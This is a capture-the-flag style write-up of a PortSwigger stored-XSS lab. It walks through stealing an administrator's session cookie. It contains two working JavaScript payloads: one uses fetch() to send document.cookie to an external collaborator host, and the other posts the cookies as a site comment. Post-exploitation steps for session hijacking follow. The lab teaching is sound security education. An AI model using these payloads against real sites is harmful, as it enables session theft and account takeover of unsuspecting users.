# 🧠 Blind XSS – Lab Write-up

**🗓️ Solution Date:** 17 / 5 / 2025  
**🔗 Lab Link:** [Exploiting cross-site scripting to steal cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies)  
**🧨 Vulnerability Type:** Blind XSS

---

## 1️⃣ Introduction

In this exercise, the goal is to exploit a **Blind XSS** vulnerability in the admin panel to steal the administrator's cookies (which contain the session ID), then use them to access their account.

---

## 2️⃣ Payload Used

```javascript
<script>
fetch('https://zfibnf4dupe0m0s3nuae4fojya41srgg.oastify.com', {
  method: 'POST',
  mode: 'no-cors',
  body: document.cookie
});
</script>
```

---

## 3️⃣ Step-by-Step Payload Analysis

|Line|Explanation|
|---|---|
|`fetch(...)`|Used to send an HTTP request to a specific server.|
|`https://...oastify.com`|This is the **attacker's server** used to collect data.|
|`method: 'POST'`|Sends data via **POST** in the request body.|
|`mode: 'no-cors'`|Allows sending the request without CORS issues, but you can't read the response through JavaScript.|
|`body: document.cookie`|Sends the **current site's cookies** (which may contain the session ID).|

---

## 4️⃣ Result

When the script is executed within the admin page, the cookies are automatically sent to the collaborator, **without the victim noticing** anything.

### 📸 Result Screenshots:

#### ✅ Receiving the request in collaborator and seeing the Session Cookie:

![Pasted image](../images/Pasted%20image%2020250517224556.png)

---

## 5️⃣ Post-Exploitation

1. Take the **session ID** visible in the collaborator.
2. ![Pasted image](../images/Pasted%20image%2020250517224959.png)

3. Reload the site and log in as the administrator.
---
# Alternative Solution

```js
<script>

window.addEventListener('DOMContentLoaded', function() {
  var token = document.getElementsByName('csrf')[0].value;
  var data = new FormData();
  data.append('csrf', token);
  data.append('postId', 8);
  data.append('comment', document.cookie);
  data.append('name', 'test name');
  data.append('email', 'test@gmail.com');
  data.append('website', 'http://test.com');

  fetch('post/comment', {
    method: 'POST',
    mode: 'no-cors',
    body: data,
  });
});

</script>
```

### First, the code is written in JavaScript and runs as soon as the page loads, using `DOMContentLoaded`:

```javascript
window.addEventListener('DOMContentLoaded', function() {
```

🔸 **What does this mean?**  
It means that as soon as all the HTML is finished loading (but not necessarily the images), the code inside the function will start running.

---

### Then:

```javascript
  var token = document.getElementsByName('csrf')[0].value;
```

🔸 **What does this do?**  
It gets the value of the CSRF token (which is a type of protection against CSRF attacks), and takes it from an input in the page named `csrf`.  
For example, if you have this in the HTML:

```html
<input type="hidden" name="csrf" value="123456">
```

Then `token` = `123456`.

---

### Then it prepares the data to send to the server:

```javascript
  var data = new FormData();
```

🔸 **What does this mean?**  
It creates an object of type `FormData`, which we use to easily send form data.

---

### Then it adds the data to send:

```javascript
  data.append('csrf', token);
  data.append('postId', 8);
  data.append('comment', document.cookie);
  data.append('name', 'test name');
  data.append('email', 'test@gmail.com');
  data.append('website', 'http://test.com');
```

🔸 **What happens here:**

- `csrf` = The value we got from above.
    
- `postId` = The post number to add the comment to (e.g., post number 8).
    
- `comment` = Here it sends all your **cookies**! (This is strange and dangerous, we'll discuss it later).
    
- `name`, `email`, `website` = Default data.
    

---

### Finally, it sends this data to the server:

```javascript
  fetch('post/comment', {
    method: 'POST',
    mode: 'no-cors',
    body: data,
  });
```

🔸 **What does this do?**

- Uses `fetch` to send this data to the `post/comment` URL via `POST`.
    
- `mode: 'no-cors'` means the browser won't block the request if the server doesn't allow this domain (but in return, you can't see the server's response).
    

---

## ⚠️ Very Important Warning:

This line in particular:

```javascript
data.append('comment', document.cookie);
```

is very dangerous because it takes the user's cookies and sends them to the server.  
This could be an attempt at **session theft** or **session hijacking** if this code is injected into someone else's site.

So if code like this is placed on a suspicious page or injected into a known site, whoever runs it could steal your session.

---

## 👀 Summary:

This code:

- Waits for the page to finish loading.
    
- Gets the CSRF token from the page.
    
- Prepares data containing information and cookies.
    
- And sends it to a specific server.
- ![Pasted image](../images/Pasted%20image%2020250517224556.png)